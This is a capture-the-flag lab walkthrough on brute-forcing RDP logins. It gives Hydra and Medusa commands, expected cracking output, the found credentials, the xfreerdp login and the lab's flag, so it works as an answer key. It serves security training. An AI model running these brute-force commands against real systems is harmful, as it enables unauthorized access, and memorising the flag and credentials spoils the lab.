# Lab 4.5: RDP Brute Force Attack

## Learning Objectives
- Brute force RDP credentials
- Use Hydra for RDP brute forcing
- Capture the flag

## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before starting brute force.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify RDP service is running:**
   ```bash
   nmap -p 3389 <target_ip>
   ```

### Step 2: Create Wordlist

Create a password wordlist for brute forcing.

**Detailed Steps:**

1. **Create wordlist with common passwords:**
   ```bash
   echo -e "password\nadmin\nqwerty\n123456" > wordlist.txt
   ```

2. **Verify wordlist was created:**
   ```bash
   cat wordlist.txt
   ```

   **Expected output:**
   ```
   password
   admin
   qwerty
   123456
   ```

3. **Add more common passwords (optional):**
   ```bash
   echo -e "password\nadmin\nqwerty\n123456\npassword123\nadmin123\nPassword123" > wordlist.txt
   ```

4. **Alternative: Use existing wordlist:**
   ```bash
   # Use rockyou.txt (large wordlist)
   head -1000 /usr/share/wordlists/rockyou.txt > wordlist.txt
   ```

### Step 3: Brute Force RDP

Use Hydra to automate password brute forcing against RDP service.

**Detailed Steps:**

1. **Verify Hydra is installed:**
   ```bash
   which hydra
   hydra -h
   ```

2. **Run Hydra brute force attack:**
   ```bash
   hydra -l admin -P wordlist.txt rdp://<target_ip>
   ```
   
   Replace `<target_ip>` with your actual target IP (e.g., `hydra -l admin -P wordlist.txt rdp://<target_ip>`)

   **Command breakdown:**
   - `hydra`: Brute force tool
   - `-l admin`: Single username to test (lowercase L)
   - `-P wordlist.txt`: Password wordlist file (uppercase P)
   - `rdp://<target_ip>`: RDP protocol and target IP

3. **Expected output:**
   ```
   Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak
   Hydra starting at 2024-01-15 10:30:00
   [DATA] max 16 tasks per 1 server, overall 16 tasks, 4 login tries (l:1/p:4), ~1 try per task
   [DATA] attacking rdp://<target_ip>:3389/
   [3389][rdp] host: <target_ip>   login: admin   password: qwerty
   [STATUS] attack finished for <target_ip> (waiting for children to complete tests)
   1 of 1 target successfully completed, 1 valid password found
   ```

4. **Key information from output:**
   - **Valid password found**: `password: qwerty`
   - **Login**: `admin`
   - **Target**: `<target_ip>`

5. **Alternative: Use Medusa (if Hydra not available):**
   ```bash
   medusa -h <target_ip> -u admin -P wordlist.txt -M rdp
   ```

**Troubleshooting:**
- If Hydra fails, verify RDP service is running on port 3389
- Try with verbose output: `hydra -V -l admin -P wordlist.txt rdp://<target_ip>`
- Reduce parallel connections: `hydra -t 1 -l admin -P wordlist.txt rdp://<target_ip>`
- Check wordlist file path is correct

### Step 4: Connect and Retrieve Flag

Use the discovered password to connect via RDP and retrieve the flag.

**Detailed Steps:**

1. **Connect with discovered credentials:**
   ```bash
   xfreerdp /v:<target_ip> /u:admin /p:qwerty
   ```
   
   Replace `<target_ip>` with your actual target IP and `qwerty` with the password discovered by Hydra.

2. **Expected successful connection:**
   - RDP client window opens
   - Linux desktop (xfce4) appears
   - You're logged in as admin

3. **Open Terminal:**
   - Right-click the desktop and select "Open Terminal Here"
   - Or open a terminal from the applications menu

4. **Navigate to flag location:**
   ```bash
   cd /home/admin
   ls flag.txt
   cat flag.txt
   ```

5. **Alternative: Use File Manager:**
   - Click the File Manager icon in the taskbar
   - Navigate to: `/home/admin/`
   - Double-click `flag.txt`

6. **Expected flag content:**
   ```
   OCR{rdp_brut3_f0rc3}
   ```

7. **Copy flag:**
   - Select flag text
   - Press `Ctrl+C` to copy

### Step 5: Verify Flag Format

Ensure the flag is in the correct format before submission.

**Flag format:**
```
OCR{rdp_brut3_f0rc3}
```

**Verification checklist:**
- ✅ Starts with `OCR{`
- ✅ Ends with `}`
- ✅ Contains only alphanumeric characters and underscores
- ✅ No extra spaces or characters

**Success Criteria:**
- ✅ Verified target IP and RDP service accessibility
- ✅ Created password wordlist with common passwords
- ✅ Ran Hydra brute force attack against RDP service
- ✅ Discovered valid password for admin user
- ✅ Successfully connected via RDP with discovered credentials
- ✅ Navigated to flag location (/home/admin/flag.txt)
- ✅ Retrieved and copied flag content
- ✅ Verified flag format is correct: `OCR{...}`

**Key Learning Points:**
- Hydra automates RDP password brute forcing
- Wordlists should contain common passwords
- Understanding Hydra output helps identify successful credentials
- Always verify discovered credentials by connecting manually
- RDP brute forcing can be slow, be patient

## Common Mistakes
- Incorrect Hydra syntax
- Wordlist too small
- Not specifying protocol

## Hints
1. Use `hydra -l admin -P wordlist.txt rdp://<target_ip>`
2. Password is in common wordlists
3. Username: admin